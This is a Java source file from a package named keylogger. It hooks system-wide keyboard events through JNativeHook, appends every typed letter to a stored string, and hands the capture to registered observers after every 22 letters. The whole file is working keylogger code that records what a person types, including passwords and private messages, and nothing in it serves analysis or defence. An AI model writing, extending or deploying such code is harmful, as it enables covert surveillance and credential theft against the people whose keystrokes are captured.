package br.com.keylogger;

import java.util.LinkedList;
import java.util.List;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Captura implements NativeKeyListener, Subject {
	private String oQueFoiEscrito = "";
	private int letrasDigitadas = 0;
	private List<Observer> observers;
	
	public Captura() {
		this.observers = new LinkedList<>();
	}
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		if(this.letrasDigitadas == 22) {
			this.notifyObserver();
			this.letrasDigitadas = 0;
		}
		
		switch(e.getKeyCode()) {
		case(NativeKeyEvent.VC_A):
			this.oQueFoiEscrito += "a";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_B):
			this.oQueFoiEscrito += "b";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_C):
			this.oQueFoiEscrito += "c";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_D):
			this.oQueFoiEscrito += "d";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_E):
			this.oQueFoiEscrito += "e";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_F):
			this.oQueFoiEscrito += "f";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_G):
			this.oQueFoiEscrito += "g";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_H):
			this.oQueFoiEscrito += "h";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_I):
			this.oQueFoiEscrito += "i";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_J):
			this.oQueFoiEscrito += "j";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_K):
			this.oQueFoiEscrito += "k";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_L):
			this.oQueFoiEscrito += "l";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_M):
			this.oQueFoiEscrito += "m";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_N):
			this.oQueFoiEscrito += "n";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_O):
			this.oQueFoiEscrito += "o";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_P):
			this.oQueFoiEscrito += "p";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_Q):
			this.oQueFoiEscrito += "q";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_R):
			this.oQueFoiEscrito += "r";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_S):
			this.oQueFoiEscrito += "s";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_T):
			this.oQueFoiEscrito += "t";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_U):
			this.oQueFoiEscrito += "u";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_V):
			this.oQueFoiEscrito += "v";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_W):
			this.oQueFoiEscrito += "w";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_X):
			this.oQueFoiEscrito += "x";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_Y):
			this.oQueFoiEscrito += "y";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_Z):
			this.oQueFoiEscrito += "z";
			this.letrasDigitadas++;	
		break;
		case(NativeKeyEvent.VC_SPACE):
			this.oQueFoiEscrito += "\n";
		break;
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		
	}

	public String getoQueFoiEscrito() {
		return oQueFoiEscrito;
	}

	public int getLetrasDigitadas() {
		return letrasDigitadas;
	}

	public void setLetrasDigitadas(int letrasDigitadas) {
		this.letrasDigitadas = letrasDigitadas;
	}

	@Override
	public void addObserver(Observer o) {
		this.observers.add(o);
		
	}

	@Override
	public void removeObserver(Observer o) {
		this.observers.remove(o);
		
	}

	@Override
	public void removeObserver(int index) {
		this.observers.remove(index);
		
	}

	@Override
	public void notifyObserver() {
		for(Observer o: this.observers) {
			o.update();
		}
	}
}
